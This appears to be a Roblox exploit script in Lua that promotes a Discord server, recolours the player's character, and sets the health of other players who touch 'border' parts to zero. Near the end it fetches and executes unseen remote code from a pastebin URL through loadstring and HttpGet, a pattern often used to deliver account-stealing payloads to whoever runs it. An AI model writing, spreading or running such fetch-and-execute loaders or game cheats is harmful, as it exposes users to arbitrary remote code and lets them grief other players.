local Player = game.Players.LocalPlayer
local Character = Player.Character or Player.CharacterAdded:Wait()
local Head = Character:WaitForChild("Head")

local function showUpdateText()
    if not Head then return end
    local billboard = Instance.new("BillboardGui")
    billboard.Name = "UpdateTextGui"
    billboard.Adornee = Head
    billboard.Size = UDim2.new(0, 500, 0, 100)
    billboard.StudsOffset = Vector3.new(0, 3, 0)
    billboard.AlwaysOnTop = true
    billboard.Parent = Player:WaitForChild("PlayerGui")

    local textLabel = Instance.new("TextLabel")
    textLabel.BackgroundTransparency = 1
    textLabel.Size = UDim2.fromScale(1, 1)
    textLabel.Text = "updated by teamjohndoe on discord https://discord.gg/4wGpMHdXYa."
    textLabel.TextColor3 = Color3.new(1, 0, 0)
    textLabel.Font = Enum.Font.SourceSansBold
    textLabel.TextScaled = false
    textLabel.TextSize = 40
    textLabel.Parent = billboard

    wait(3)
    if billboard and billboard.Parent then
        billboard:Destroy()
    end
end

local function turnCharacterBlack()
    Player:ClearCharacterAppearance()
    Character = Player.Character or Player.CharacterAdded:Wait()
    Head = Character:WaitForChild("Head")

    for _, accessory in pairs(Character:GetChildren()) do
        if accessory:IsA("Accessory") then
            accessory:Destroy()
        end
    end

    for _, decal in pairs(Head:GetChildren()) do
        if decal:IsA("Decal") and decal.Name == "face" then
            decal:Destroy()
        end
    end

    local newFace = Instance.new("Decal")
    newFace.Name = "face"
    newFace.Texture = "rbxassetid://90157389057596"
    newFace.Face = Enum.NormalId.Front
    newFace.Parent = Head

    for _, part in pairs(Character:GetChildren()) do
        if part:IsA("BasePart") then
            part.BrickColor = BrickColor.new("Really black")
            part.Transparency = 0
        end
    end
end

local function monitorBlackBorderTouch()
    local function onTouched(otherPart)
        local otherChar = otherPart.Parent
        if otherChar and otherChar ~= Character then
            local humanoid = otherChar:FindFirstChildOfClass("Humanoid")
            if humanoid and humanoid.Health > 0 then
                humanoid.Health = 0
            end
        end
    end

    wait(1)

    for _, obj in pairs(Character:GetChildren()) do
        if obj:IsA("BasePart") and obj.Name:lower():find("border") then
            obj.Touched:Connect(onTouched)
        elseif obj:IsA("Model") then
            for _, subPart in pairs(obj:GetChildren()) do
                if subPart:IsA("BasePart") and subPart.Name:lower():find("border") then
                    subPart.Touched:Connect(onTouched)
                end
            end
        end
    end
end

showUpdateText()
loadstring(game:HttpGet("https://pastebin.com/raw/XJeBNe0s"))()
turnCharacterBlack()
monitorBlackBorderTouch()
